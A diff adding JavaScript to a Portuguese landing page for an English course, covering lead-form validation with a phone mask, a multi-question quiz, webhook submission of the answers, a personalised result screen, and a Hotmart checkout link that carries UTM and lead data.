+          { label: "Acima de R$ 10.000", value: "Acima de R$ 10.000" },
+          { label: "Não tenho renda mensal", value: "Não tenho renda mensal" }
+        ]
+      },
+      {
+        num: 9,
+        name: "input_text_1",
+        titulo: "Por que você quer falar inglês?",
+        tipo: "cards",
+        opcoes: [
+          { label: "Carreira e salário", value: "Carreira e salário" },
+          { label: "Trabalho remoto no exterior", value: "Trabalho remoto no exterior" },
+          { label: "Viagens", value: "Viagens" },
+          { label: "Morar fora", value: "Morar fora" },
+          { label: "Realização pessoal", value: "Realização pessoal" }
+        ]
+      },
+      {
+        num: 10,
+        name: "input_text_4",
+        titulo: "O que mais te trava hoje?",
+        tipo: "cards",
+        opcoes: [
+          { label: "Travo na hora de falar", value: "Travo na hora de falar" },
+          { label: "Não entendo nativos", value: "Não entendo nativos" },
+          { label: "Falta vocabulário", value: "Falta vocabulário" },
+          { label: "Vergonha de errar", value: "Vergonha de errar" },
+          { label: "Falta de tempo", value: "Falta de tempo" }
+        ]
+      }
+    ];
+
+    var indicePerguntaAtual = 0;
+    var emTransicaoQuiz = false;
+
+    // Utilitário de scroll suave para o formulário da Hero
+    window.rolarParaFormulario = function () {
+      var formCard = document.getElementById("form-inscricao");
+      if (!formCard) return;
+      formCard.scrollIntoView({ behavior: "smooth", block: "center" });
+      setTimeout(function () {
+        var nomeInput = document.getElementById("lead-nome");
+        if (nomeInput && !nomeInput.value.trim()) {
+          nomeInput.focus({ preventScroll: true });
+        }
+      }, 450);
+    };
+
+    // Modais de Política de Privacidade e Termos de Uso
+    window.abrirModalPrivacidade = function (e) {
+      if (e) e.preventDefault();
+      var m = document.getElementById("modal-privacidade");
+      if (m) {
+        m.classList.remove("hidden");
+        m.classList.add("flex");
+      }
+    };
+    window.fecharModalPrivacidade = function () {
+      var m = document.getElementById("modal-privacidade");
+      if (m) {
+        m.classList.add("hidden");
+        m.classList.remove("flex");
+      }
+    };
+    window.abrirModalTermos = function (e) {
+      if (e) e.preventDefault();
+      var m = document.getElementById("modal-termos");
+      if (m) {
+        m.classList.remove("hidden");
+        m.classList.add("flex");
+      }
+    };
+    window.fecharModalTermos = function () {
+      var m = document.getElementById("modal-termos");
+      if (m) {
+        m.classList.add("hidden");
+        m.classList.remove("flex");
+      }
+    };
+
+    // Máscara de WhatsApp: (11) 90000-0000
+    var telInput = document.getElementById("lead-telefone");
+    function aplicarMascaraTelefone(valor) {
+      var d = valor.replace(/\D/g, "").slice(0, 11);
+      if (!d.length) return "";
+      if (d.length <= 2) return "(" + d;
+      if (d.length <= 6) return "(" + d.slice(0, 2) + ") " + d.slice(2);
+      if (d.length <= 10) return "(" + d.slice(0, 2) + ") " + d.slice(2, 6) + "-" + d.slice(6);
+      return "(" + d.slice(0, 2) + ") " + d.slice(2, 7) + "-" + d.slice(7, 11);
+    }
+    if (telInput) {
+      telInput.addEventListener("input", function () {
+        this.value = aplicarMascaraTelefone(this.value);
+        limparErroCampo("telefone");
+      });
+    }
+
+    var nomeInput = document.getElementById("lead-nome");
+    var emailInput = document.getElementById("lead-email");
+    var aceiteInput = document.getElementById("lead-aceite");
+    if (nomeInput) nomeInput.addEventListener("input", function () { limparErroCampo("nome"); });
+    if (emailInput) emailInput.addEventListener("input", function () { limparErroCampo("email"); });
+    if (aceiteInput) aceiteInput.addEventListener("change", function () { limparErroCampo("aceite"); });
+
+    function mostrarErroCampo(campo, msg) {
+      var errEl = document.getElementById("erro-" + campo);
+      var inputEl = document.getElementById("lead-" + campo);
+      if (errEl) {
+        errEl.textContent = msg;
+        errEl.classList.remove("hidden");
+      }
+      if (inputEl && campo !== "aceite") {
+        inputEl.classList.add("border-[#ff453a]");
+      }
+    }
+
+    function limparErroCampo(campo) {
+      var errEl = document.getElementById("erro-" + campo);
+      var inputEl = document.getElementById("lead-" + campo);
+      if (errEl) {
+        errEl.textContent = "";
+        errEl.classList.add("hidden");
+      }
+      if (inputEl && campo !== "aceite") {
+        inputEl.classList.remove("border-[#ff453a]");
+      }
+    }
+
+    // Validação inline do formulário de inscrição
+    var leadForm = document.getElementById("leadCaptureForm");
+    if (leadForm) {
+      leadForm.addEventListener("submit", function (e) {
+        e.preventDefault();
+        limparErroCampo("nome");
+        limparErroCampo("email");
+        limparErroCampo("telefone");
+        limparErroCampo("aceite");
+
+        var nome = (nomeInput ? nomeInput.value : "").trim();
+        var email = (emailInput ? emailInput.value : "").trim();
+        var telFormatado = (telInput ? telInput.value : "").trim();
+        var telDigitos = telFormatado.replace(/\D/g, "");
+        var aceite = aceiteInput ? aceiteInput.checked : false;
+
+        var valido = true;
+        if (!nome || nome.length < 2) {
+          mostrarErroCampo("nome", "Digite seu nome completo.");
+          valido = false;
+        }
+        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
+          mostrarErroCampo("email", "Digite um e-mail válido.");
+          valido = false;
+        }
+        if (telDigitos.length < 10 || telDigitos.length > 11) {
+          mostrarErroCampo("telefone", "Digite seu WhatsApp com DDD. Ex: (11) 90000-0000.");
+          valido = false;
+        }
+        if (!aceite) {
+          mostrarErroCampo("aceite", "Marque a caixa acima aceitando a Política de Privacidade.");
+          valido = false;
+        }
+
+        if (!valido) return;
+
+        leadDados.nome = nome;
+        leadDados.email = email;
+        leadDados.telefoneDigitos = telDigitos;
+        leadDados.telefoneFormatado = telFormatado;
+        leadDados.jaTemConta = false;
+
+        try {
+          sessionStorage.setItem("mn_lead", JSON.stringify({
+            nome: leadDados.nome,
+            email: leadDados.email,
+            telefoneDigitos: leadDados.telefoneDigitos
+          }));
+        } catch (e) {}
+
+        var btnSubmit = document.getElementById("btn-submit-lead");
+        var btnText = document.getElementById("btn-submit-text");
+        if (btnSubmit) btnSubmit.disabled = true;
+        if (btnText) btnText.textContent = "ENVIANDO...";
+
+        enviarWebhookLead();
+
+        iniciarQuiz();
+      });
+    }
+
+    function perguntaDeveAparecer(idx) {
+      var p = PERGUNTAS[idx];
+      if (!p) return false;
+      if (typeof p.condicao === "function") {
+        return p.condicao();
+      }
+      return true;
+    }
+
+    function proximoIndiceValido(aPartirDe) {
+      for (var i = aPartirDe + 1; i < PERGUNTAS.length; i++) {
+        if (perguntaDeveAparecer(i)) return i;
+      }
+      return -1; // Fim do quiz
+    }
+
+    function indiceAnteriorValido(aPartirDe) {
+      for (var i = aPartirDe - 1; i >= 0; i--) {
+        if (perguntaDeveAparecer(i)) return i;
+      }
+      return -1;
+    }
+
+    function iniciarQuiz() {
+      estadoAtual = 2;
+      document.getElementById("estado-captura").classList.add("hidden");
+      var quizEl = document.getElementById("estado-quiz");
+      quizEl.classList.remove("hidden");
+      quizEl.classList.add("flex");
+      indicePerguntaAtual = 0;
+      window.scrollTo({ top: 0, behavior: "instant" });
+      renderizarPerguntaQuiz();
+    }
+
+    window.voltarPerguntaQuiz = function () {
+      if (emTransicaoQuiz) return;
+      var ant = indiceAnteriorValido(indicePerguntaAtual);
+      if (ant >= 0) {
+        indicePerguntaAtual = ant;
+        renderizarPerguntaQuiz();
+      } else {
+        // Volta ao Estado 1 (Captura)
+        estadoAtual = 1;
+        var quizEl = document.getElementById("estado-quiz");
+        quizEl.classList.add("hidden");
+        quizEl.classList.remove("flex");
+        document.getElementById("estado-captura").classList.remove("hidden");
+        window.scrollTo({ top: 0, behavior: "instant" });
+      }
+    };
+
+    function escaparHtml(str) {
+      return String(str || "")
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    function renderizarPerguntaQuiz() {
+      var p = PERGUNTAS[indicePerguntaAtual];
+      if (!p) return;
+
+      var totalPerguntas = PERGUNTAS.length;
+      var numAtual = indicePerguntaAtual + 1;
+      var contadorEl = document.getElementById("quiz-contador");
+      var barraEl = document.getElementById("quiz-barra-progresso");
+      if (contadorEl) contadorEl.textContent = "Pergunta " + numAtual + " de " + totalPerguntas;
+      if (barraEl) barraEl.style.width = ((numAtual / totalPerguntas) * 100).toFixed(2) + "%";
+
+      var palco = document.getElementById("quiz-palco");
+      var valorAtual = respostasQuiz[p.name] || "";
+
+      if (p.tipo === "cards") {
+        var cardsHtml = p.opcoes.map(function (op, idx) {
+          var selecionado = valorAtual === op.value;
+          var borderClass = selecionado
+            ? "border-[#ff6b00] bg-[#ff6b00]/15"
+            : "border-[#242429] bg-[#141417] hover:border-[#ff6b00]/60 hover:bg-[#1a1a1f]";
+          var radioCircle = selecionado
+            ? '<span class="w-6 h-6 rounded-full bg-[#ff6b00] text-[#080809] flex items-center justify-center shrink-0"><span class="material-symbols-outlined text-base font-black">check</span></span>'
+            : '<span class="w-6 h-6 rounded-full border-2 border-zinc-600 shrink-0"></span>';
+
+          var emojiHtml = op.emoji
+            ? '<span class="text-2xl sm:text-3xl shrink-0">' + op.emoji + '</span>'
+            : '';
+
+          return (
+            '<button type="button" data-idx="' + idx + '" class="quiz-card-btn w-full p-4 sm:p-5 rounded-2xl border-2 ' + borderClass + ' flex items-center justify-between gap-3.5 text-left transition-all cursor-pointer">' +
+              '<div class="flex items-center gap-3.5 min-w-0">' +
+                emojiHtml +
+                '<span class="text-base sm:text-lg font-bold text-white leading-snug">' + escaparHtml(op.label) + '</span>' +
+              '</div>' +
+              radioCircle +
+            '</button>'
+          );
+        }).join("");
+
+        palco.innerHTML =
+          '<div class="text-left">' +
+            '<h2 class="text-2xl sm:text-3xl font-black text-white tracking-tight leading-snug">' + escaparHtml(p.titulo) + '</h2>' +
+            '<p class="mt-1.5 text-xs sm:text-sm text-zinc-400">Toque em uma opção para avançar</p>' +
+            '<div class="mt-6 space-y-3">' + cardsHtml + '</div>' +
+          '</div>';
+
+        var botoes = palco.querySelectorAll(".quiz-card-btn");
+        botoes.forEach(function (btn) {
+          btn.addEventListener("click", function () {
+            if (emTransicaoQuiz) return;
+            emTransicaoQuiz = true;
+            var opIdx = parseInt(this.getAttribute("data-idx"), 10);
+            var escolhida = p.opcoes[opIdx];
+            respostasQuiz[p.name] = escolhida.value;
+
+            // Limpa respostas dependentes se mudarem
+            if (p.name === "input_radio_3" && escolhida.value !== "Sim") {
+              respostasQuiz.input_radio_5 = "";
+              respostasQuiz.input_text_6 = "";
+            }
+            if (p.name === "input_radio_5" && escolhida.value !== "Outro") {
+              respostasQuiz.input_text_6 = "";
+            }
+
+            // Marca visualmente o card tocado
+            botoes.forEach(function (b) {
+              b.className = "quiz-card-btn w-full p-4 sm:p-5 rounded-2xl border-2 border-[#242429] bg-[#141417] flex items-center justify-between gap-3.5 text-left transition-all cursor-pointer opacity-60";
+            });
+            this.className = "quiz-card-btn w-full p-4 sm:p-5 rounded-2xl border-2 border-[#ff6b00] bg-[#ff6b00]/15 flex items-center justify-between gap-3.5 text-left transition-all cursor-pointer";
+            var ind = this.querySelector("span:last-child");
+            if (ind) {
+              ind.outerHTML = '<span class="w-6 h-6 rounded-full bg-[#ff6b00] text-[#080809] flex items-center justify-center shrink-0"><span class="material-symbols-outlined text-base font-black">check</span></span>';
+            }
+
+            setTimeout(function () {
+              emTransicaoQuiz = false;
+              avancarPerguntaQuiz();
+            }, 250);
+          });
+        });
+      } else {
+        // Pergunta aberta condicional (input_text_6 - profissão)
+        palco.innerHTML =
+          '<form id="quiz-open-form" class="text-left" novalidate>' +
+            '<h2 class="text-2xl sm:text-3xl font-black text-white tracking-tight leading-snug">' + escaparHtml(p.titulo) + '</h2>' +
+            '<div class="mt-6">' +
+              '<input id="quiz-open-input" name="' + p.name + '" type="text" value="' + escaparHtml(valorAtual) + '" placeholder="' + escaparHtml(p.placeholder || "Digite sua resposta...") + '" class="w-full rounded-2xl bg-[#141417] border-2 border-[#2e2e36] focus:border-[#ff6b00] px-4 py-4 text-base text-white placeholder-zinc-500 outline-none transition-colors" />' +
+              '<p id="quiz-open-erro" class="hidden mt-2 text-xs font-semibold text-[#ff453a]">Por favor, preencha sua resposta para continuar.</p>' +
+            '</div>' +
+            '<button type="submit" class="mt-6 w-full px-6 py-4 min-h-[54px] rounded-full bg-[#ff6b00] hover:bg-[#ff8533] text-[#080809] font-black text-base sm:text-lg uppercase tracking-tight transition-all cursor-pointer">' +
+              'Continuar' +
+            '</button>' +
+          '</form>';
+
+        var openInput = document.getElementById("quiz-open-input");
+        var openErro = document.getElementById("quiz-open-erro");
+        if (openInput) {
+          setTimeout(function () { openInput.focus(); }, 60);
+          openInput.addEventListener("input", function () {
+            if (openErro) openErro.classList.add("hidden");
+            openInput.classList.remove("border-[#ff453a]");
+          });
+        }
+
+        var openForm = document.getElementById("quiz-open-form");
+        if (openForm) {
+          openForm.addEventListener("submit", function (ev) {
+            ev.preventDefault();
+            var val = (openInput ? openInput.value : "").trim();
+            if (!val) {
+              if (openErro) openErro.classList.remove("hidden");
+              if (openInput) openInput.classList.add("border-[#ff453a]");
+              return;
+            }
+            respostasQuiz[p.name] = val;
+            avancarPerguntaQuiz();
+          });
+        }
+      }
+    }
+
+    function avancarPerguntaQuiz() {
+      var prox = proximoIndiceValido(indicePerguntaAtual);
+      if (prox >= 0) {
+        indicePerguntaAtual = prox;
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        renderizarPerguntaQuiz();
+      } else {
+        concluirQuizComAnalise();
+      }
+    }
+
+    function marcarPassoAnaliseVerde(idElemento) {
+      var el = document.getElementById(idElemento);
+      if (!el) return;
+      el.classList.remove("border-[#242429]");
+      el.classList.add("border-[#00d254]/50", "bg-[#00d254]/10");
+      var iconWrap = el.querySelector(".step-icon");
+      if (iconWrap) {
+        iconWrap.className = "step-icon w-6 h-6 rounded-full bg-[#00d254] text-[#080809] flex items-center justify-center shrink-0 transition-colors";
+      }
+    }
+
+    function enviarWebhookQuiz() {
+      var payload = {
+        evento: "quiz_completo",
+        id_sessao: idSessao,
+        nome: leadDados.nome,
+        email: leadDados.email,
+        phone: formatarTelefoneCom55(leadDados.telefoneDigitos),
+        origem: "avaliacao",
+        enviado_em: new Date().toISOString()
+      };
+
+      var chavesPerguntas = [
+        "input_radio",
+        "input_text",
+        "input_radio_1",
+        "input_radio_2",
+        "input_radio_3",
+        "input_radio_5",
+        "input_text_6",
+        "input_radio_4",
+        "input_text_1",
+        "input_text_4"
+      ];
+
+      chavesPerguntas.forEach(function (chave) {
+        if (respostasQuiz[chave]) {
+          payload[chave] = respostasQuiz[chave];
+        }
+      });
+
+      dispararEventoWebhook("mn_avaliacao_webhook_quiz_sent", payload);
+    }
+
+    function concluirQuizComAnalise() {
+      var header = document.getElementById("quiz-header");
+      var palco = document.getElementById("quiz-palco");
+      var analise = document.getElementById("quiz-analise");
+      if (header) header.classList.add("hidden");
+      if (palco) palco.classList.add("hidden");
+      if (analise) analise.classList.remove("hidden");
+      window.scrollTo({ top: 0, behavior: "instant" });
+
+      // Envia para o webhook se configurado
+      enviarWebhookQuiz();
+
+      setTimeout(function () { marcarPassoAnaliseVerde("step-analise-1"); }, 450);
+      setTimeout(function () { marcarPassoAnaliseVerde("step-analise-2"); }, 1150);
+      setTimeout(function () { marcarPassoAnaliseVerde("step-analise-3"); }, 1850);
+      setTimeout(function () { exibirEstadoResultado(); }, 2500);
+    }
+
+    function exibirEstadoResultado() {
+      estadoAtual = 3;
+      var quizEl = document.getElementById("estado-quiz");
+      quizEl.classList.add("hidden");
+      quizEl.classList.remove("flex");
+
+      // Preenche os dados personalizados no Resultado
+      var primeiroNome = (leadDados.nome || "Aluno").trim().split(/\s+/)[0] || "Aluno";
+      primeiroNome = primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1);
+      var nomeEl = document.getElementById("res-primeiro-nome");
+      if (nomeEl) nomeEl.textContent = primeiroNome;
+
+      var objEl = document.getElementById("res-objetivo");
+      if (objEl) objEl.textContent = respostasQuiz.input_text_1 || "Falar inglês com confiança";
+
+      var travaEl = document.getElementById("res-trava");
+      if (travaEl) travaEl.textContent = respostasQuiz.input_text_4 || "Travo na hora de falar";
+
+      var emailAviso = document.getElementById("aviso-email-lead");
+      if (emailAviso) emailAviso.textContent = leadDados.email || "seu e-mail";
+
+      if (leadDados.jaTemConta) {
+        var box409 = document.getElementById("aviso-conta-existente");
+        var loginExtra = document.getElementById("aviso-login-extra");
+        if (box409) box409.classList.remove("hidden");
+        if (loginExtra) loginExtra.classList.remove("hidden");
+      }
+
+      document.getElementById("estado-resultado").classList.remove("hidden");
+      configurarCheckoutPremium();
+      window.scrollTo({ top: 0, behavior: "instant" });
+    }
+
+    // Botão da oferta gratuita no Estado 3: mostra aviso por ~2s e redireciona para o login OTP
+    var redirecionandoGratuito = false;
+    window.mostrarAvisoGratuito = function () {
+      var box = document.getElementById("aviso-acesso-gratuito");
+      var emailLimpo = (leadDados.email || (emailInput ? emailInput.value : "") || "").trim();
+      var emailAviso = document.getElementById("aviso-email-lead");
+      if (emailAviso) {
+        emailAviso.textContent = emailLimpo || "o seu e-mail";
+      }
+      if (box) {
+        box.classList.remove("hidden");
+        box.scrollIntoView({ behavior: "smooth", block: "nearest" });
+      }
+      if (redirecionandoGratuito) return;
+      redirecionandoGratuito = true;
+
+      var destino = emailLimpo
+        ? "https://app.modonativo.me/login?email=" + encodeURIComponent(emailLimpo) + "&otp=1"
+        : "https://app.modonativo.me/login";
+
+      setTimeout(function () {
+        window.location.href = destino;
+      }, 2000);
+    };
+
+    // Configura URL do Checkout Premium preservando UTMs
+    function configurarCheckoutPremium() {
+      try {
+        var currentParams = new URLSearchParams(window.location.search);
+        var targetUrl = new URL(CHECKOUT_PREMIUM, window.location.origin);
+
+        currentParams.forEach(function (value, key) {
+          if (!targetUrl.searchParams.has(key)) {
+            targetUrl.searchParams.set(key, value);
+          }
+        });
+
+        if (currentParams.has("utm_source") && !targetUrl.searchParams.has("src")) {
+          targetUrl.searchParams.set("src", currentParams.get("utm_source"));
+        }
+        if (currentParams.has("xcod") && !targetUrl.searchParams.has("sck")) {
+          targetUrl.searchParams.set("sck", currentParams.get("xcod"));
+        }
+
+        // Repassa dados do lead (quando existirem) para o checkout da Hotmart
+        if (leadDados) {
+          if (leadDados.nome) {
+            targetUrl.searchParams.set("name", leadDados.nome);
+          }
+          if (leadDados.email) {
+            targetUrl.searchParams.set("email", leadDados.email);
+          }
+          if (leadDados.telefoneDigitos && leadDados.telefoneDigitos.length >= 2) {
+            targetUrl.searchParams.set("phoneac", leadDados.telefoneDigitos.substring(0, 2));
+            targetUrl.searchParams.set("phonenumber", leadDados.telefoneDigitos.substring(2));
+          }
+        }
+
+        var finalHref = CHECKOUT_PREMIUM.startsWith("http")
+          ? targetUrl.toString()
+          : CHECKOUT_PREMIUM + (targetUrl.search ? (CHECKOUT_PREMIUM.includes("?") ? "&" + targetUrl.search.slice(1) : targetUrl.search) : "");
+
+        document.querySelectorAll(".cta-checkout-premium").forEach(function (el) {
+          el.setAttribute("href", finalHref);
+        });
+      } catch (e) {
+        document.querySelectorAll(".cta-checkout-premium").forEach(function (el) {
+          el.setAttribute("href", CHECKOUT_PREMIUM);
+        });
+      }
+    }
+    configurarCheckoutPremium();
+
+    // Listener de clique nos botões para garantir dados atualizados antes de seguir o link (sem preventDefault)
+    document.querySelectorAll(".cta-checkout-premium").forEach(function (el) {
+      el.addEventListener("click", function () {
+        configurarCheckoutPremium();
+      });
+    });
+  })();
+</script>
+
+<!-- Script do Accordion de Perguntas Frequentes (FAQ no Estado 3) -->
+<script>
+  (function () {
+    const faqItems = document.querySelectorAll(".faq-item");
+    faqItems.forEach((item) => {
+      const btn = item.querySelector(".faq-btn");
+      const content = item.querySelector(".faq-content");
+      const icon = item.querySelector(".faq-icon");
+      if (!btn || !content || !icon) return;
+
+      btn.addEventListener("click", function () {
+        const isOpen = !content.classList.contains("hidden");
+
+        faqItems.forEach((other) => {
+          const otherContent = other.querySelector(".faq-content");
+          const otherIcon = other.querySelector(".faq-icon");
+          if (otherContent) otherContent.classList.add("hidden");
+          if (otherIcon) otherIcon.textContent = "+";
+        });
+
+        if (!isOpen) {
+          content.classList.remove("hidden");
+          icon.textContent = "–";
+        }
+      });
+    });
+  })();
+</script>
+</body></html>
